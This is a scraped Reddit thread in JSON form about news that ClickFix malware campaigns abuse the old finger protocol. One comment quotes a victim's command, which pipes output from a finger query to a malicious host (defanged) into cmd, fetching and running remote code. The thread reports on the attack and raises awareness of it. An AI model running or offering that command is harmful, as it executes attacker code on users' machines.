@@ -1,0 +1,326 @@
+{
+  "post": {
+    "id": "1oyfbhg",
+    "title": "Decades-old ‘Finger’ protocol abused in ClickFix malware attacks",
+    "author": "ControlCAD",
+    "score_history": [
+      [
+        67,
+        "2025-11-18T14:21:55.908018"
+      ],
+      [
+        62,
+        "2025-11-18T14:32:10.741160"
+      ],
+      [
+        59,
+        "2025-11-18T14:35:07.893282"
+      ]
+    ],
+    "created_utc": 1763277353.0,
+    "num_comments": 8,
+    "subreddit": "technews",
+    "url": "https://www.bleepingcomputer.com/news/security/decades-old-finger-protocol-abused-in-clickfix-malware-attacks/#comments",
+    "selftext": "",
+    "permalink": "/r/technews/comments/1oyfbhg/decadesold_finger_protocol_abused_in_clickfix/"
+  },
+  "comments": [
+    {
+      "id": "np4980u",
+      "parent_id": "t3_1oyfbhg",
+      "author": "uluqat",
+      "text_history": [
+        [
+          "I'm so old that I remember using this protocol back when I was walking to school uphill both ways through the snow in September, and I'm shocked that even the slightest remnant of that protocol still remains usable today.",
+          "2025-11-18T14:21:55.908018"
+        ]
+      ],
+      "score_history": [
+        [
+          19,
+          "2025-11-18T14:21:55.908018"
+        ],
+        [
+          19,
+          "2025-11-18T14:32:10.741160"
+        ],
+        [
+          19,
+          "2025-11-18T14:35:07.893282"
+        ]
+      ],
+      "created_utc": 1763282591.0,
+      "depth": 0,
+      "permalink": "/r/technews/comments/1oyfbhg/decadesold_finger_protocol_abused_in_clickfix/np4980u/",
+      "is_submitter": false,
+      "controversiality": 0,
+      "gilded": 0,
+      "edited": false,
+      "deleted": false,
+      "deleted_at": null,
+      "replies": []
+    },
+    {
+      "id": "np4qatn",
+      "parent_id": "t3_1oyfbhg",
+      "author": "JDGumby",
+      "text_history": [
+        [
+          "&gt; When executed, the finger command returns basic information about a user, including their login name, name (if set in /etc/passwd), home directory, phone numbers, last seen, and other details.  \n\nOf course, most of the sensitive stuff requires the user to have deliberately entered it into the system for some reason.\n\nAnd, obviously, you have to already know their login name (thus their home directory in 99.99% of cases) and, if doing it remotely, their host name/IP address.\n\nedit:  \n&gt; For example, a person on Reddit recently warned that they fell victim to a ClickFix attack that impersonated a Captcha, prompting them to run a Windows command to verify they were human.\n\n&gt; \"I just fell for verify you are human win + r. What do I do?,\" reads the Reddit post.\n\n&gt; \"I was in a rush and fell for this and ended up entering the following in my cmd prompt:\"\n\n&gt; \"cmd /c start \"\" /min cmd /c \"finger vke[at]finger.cloudmega[.]org | cmd\" &amp;&amp; echo' Verify you are human--press ENTER'\"\n\nedit 2:(\"@\" to \"[at]\" to stop Reddit from automatically linkifying the email address)\n\nSeriously? How can you be so stupid as to open up a command prompt and type all of that because you were \"in a rush\"?",
+          "2025-11-18T14:21:55.908018"
+        ]
+      ],
+      "score_history": [
+        [
+          12,
+          "2025-11-18T14:21:55.908018"
+        ],
+        [
+          12,
+          "2025-11-18T14:32:10.741160"
+        ],
+        [
+          11,
+          "2025-11-18T14:35:07.893282"
+        ]
+      ],
+      "created_utc": 1763292953.0,
+      "depth": 0,
+      "permalink": "/r/technews/comments/1oyfbhg/decadesold_finger_protocol_abused_in_clickfix/np4qatn/",
+      "is_submitter": false,
+      "controversiality": 0,
+      "gilded": 0,
+      "edited": 1763293203.0,
+      "deleted": false,
+      "deleted_at": null,
+      "replies": [
+        {
+          "id": "np6k52v",
+          "parent_id": "t1_np4qatn",
+          "author": "uluqat",
+          "text_history": [
+            [
+              "Scar knew what was up when he mournfully announced, \"I am surrounded by idiots.\"",
+              "2025-11-18T14:21:55.908018"
+            ]
+          ],
+          "score_history": [
+            [
+              3,
+              "2025-11-18T14:21:55.908018"
+            ],
+            [
+              3,
+              "2025-11-18T14:32:10.741160"
+            ],
+            [
+              3,
+              "2025-11-18T14:35:07.893282"
+            ]
+          ],
+          "created_utc": 1763316982.0,
+          "depth": 1,
+          "permalink": "/r/technews/comments/1oyfbhg/decadesold_finger_protocol_abused_in_clickfix/np6k52v/",
+          "is_submitter": false,
+          "controversiality": 0,
+          "gilded": 0,
+          "edited": false,
+          "deleted": false,
+          "deleted_at": null,
+          "replies": []
+        }
+      ]
+    },
+    {
+      "id": "np5sbum",
+      "parent_id": "t3_1oyfbhg",
+      "author": "holiday-42",
+      "text_history": [
+        [
+          "I recall discovering this, by accident, with a nearby ISP.  In 2001.  We called them up and they took it down.\n\nStill there's plain telnet and idrac/ ilo./bmc exposed too to this day.  Crazy.",
+          "2025-11-18T14:21:55.908018"
+        ]
+      ],
+      "score_history": [
+        [
+          5,
+          "2025-11-18T14:21:55.908018"
+        ],
+        [
+          5,
+          "2025-11-18T14:32:10.741160"
+        ],
+        [
+          5,
+          "2025-11-18T14:35:07.893282"
+        ]
+      ],
+      "created_utc": 1763308325.0,
+      "depth": 0,
+      "permalink": "/r/technews/comments/1oyfbhg/decadesold_finger_protocol_abused_in_clickfix/np5sbum/",
+      "is_submitter": false,
+      "controversiality": 0,
+      "gilded": 0,
+      "edited": false,
+      "deleted": false,
+      "deleted_at": null,
+      "replies": []
+    },
+    {
+      "id": "np5qmk1",
+      "parent_id": "t3_1oyfbhg",
+      "author": "ComputerSong",
+      "text_history": [
+        [
+          "Finger has no purpose on single user systems.  It shouldn’t be a part of windows by default.",
+          "2025-11-18T14:21:55.908018"
+        ]
+      ],
+      "score_history": [
+        [
+          4,
+          "2025-11-18T14:21:55.908018"
+        ],
+        [
+          4,
+          "2025-11-18T14:32:10.741160"
+        ],
+        [
+          4,
+          "2025-11-18T14:35:07.893282"
+        ]
+      ],
+      "created_utc": 1763307784.0,
+      "depth": 0,
+      "permalink": "/r/technews/comments/1oyfbhg/decadesold_finger_protocol_abused_in_clickfix/np5qmk1/",
+      "is_submitter": false,
+      "controversiality": 0,
+      "gilded": 0,
+      "edited": false,
+      "deleted": false,
+      "deleted_at": null,
+      "replies": []
+    },
+    {
+      "id": "np8n0u9",
+      "parent_id": "t3_1oyfbhg",
+      "author": "digitaljestin",
+      "text_history": [
+        [
+          "The email server at my college was still running finger, and it would show you the last time that user checked their email.  It wasn't too useful, but it gave me some insight a few times as to whether someone had gotten my message.",
+          "2025-11-18T14:21:55.908018"
+        ]
+      ],
+      "score_history": [
+        [
+          2,
+          "2025-11-18T14:21:55.908018"
+        ],
+        [
+          2,
+          "2025-11-18T14:32:10.741160"
+        ],
+        [
+          2,
+          "2025-11-18T14:35:07.893282"
+        ]
+      ],
+      "created_utc": 1763340663.0,
+      "depth": 0,
+      "permalink": "/r/technews/comments/1oyfbhg/decadesold_finger_protocol_abused_in_clickfix/np8n0u9/",
+      "is_submitter": false,
+      "controversiality": 0,
+      "gilded": 0,
+      "edited": false,
+      "deleted": false,
+      "deleted_at": null,
+      "replies": []
+    },
+    {
+      "id": "npao2wu",
+      "parent_id": "t3_1oyfbhg",
+      "author": "TheBrands360",
+      "text_history": [
+        [
+          "The fact that *Finger*, a protocol older than most of the internet, is now part of modern malware chains is wild. Hackers really don’t let anything die.",
+          "2025-11-18T14:21:55.908018"
+        ]
+      ],
+      "score_history": [
+        [
+          2,
+          "2025-11-18T14:21:55.908018"
+        ],
+        [
+          2,
+          "2025-11-18T14:32:10.741160"
+        ],
+        [
+          2,
+          "2025-11-18T14:35:07.893282"
+        ]
+      ],
+      "created_utc": 1763375516.0,
+      "depth": 0,
+      "permalink": "/r/technews/comments/1oyfbhg/decadesold_finger_protocol_abused_in_clickfix/npao2wu/",
+      "is_submitter": false,
+      "controversiality": 0,
+      "gilded": 0,
+      "edited": false,
+      "deleted": false,
+      "deleted_at": null,
+      "replies": []
+    },
+    {
+      "id": "npdt89x",
+      "parent_id": "t3_1oyfbhg",
+      "author": "jdefr",
+      "text_history": [
+        [
+          "Finger command still on most machines and can list users",
+          "2025-11-18T14:21:55.908018"
+        ]
+      ],
+      "score_history": [
+        [
+          1,
+          "2025-11-18T14:21:55.908018"
+        ],
+        [
+          1,
+          "2025-11-18T14:32:10.741160"
+        ],
+        [
+          1,
+          "2025-11-18T14:35:07.893282"
+        ]
+      ],
+      "created_utc": 1763414007.0,
+      "depth": 0,
+      "permalink": "/r/technews/comments/1oyfbhg/decadesold_finger_protocol_abused_in_clickfix/npdt89x/",
+      "is_submitter": false,
+      "controversiality": 0,
+      "gilded": 0,
+      "edited": false,
+      "deleted": false,
+      "deleted_at": null,
+      "replies": []
+    }
+  ],
+  "metadata": {
+    "scraped_at": "2025-11-18T14:35:07.893282",
+    "scraper_version": "api_recursive_temporal_v1",
+    "source_url": "https://www.reddit.com/r/technews/comments/1oyfbhg/decadesold_finger_protocol_abused_in_clickfix/",
+    "total_comments": 8,
+    "top_level_comments": 7,
+    "api_requests": 1,
+    "expected_comments": 8,
+    "coverage_percent": 100.0,
+    "merged_snapshot_count": 3,
+    "merged_snapshot_files": [
+      "scrape_001_20251118_142155.json",
+      "scrape_002_20251118_143210.json",
+      "scrape_003_20251118_143507.json"
+    ]
+  }
+}
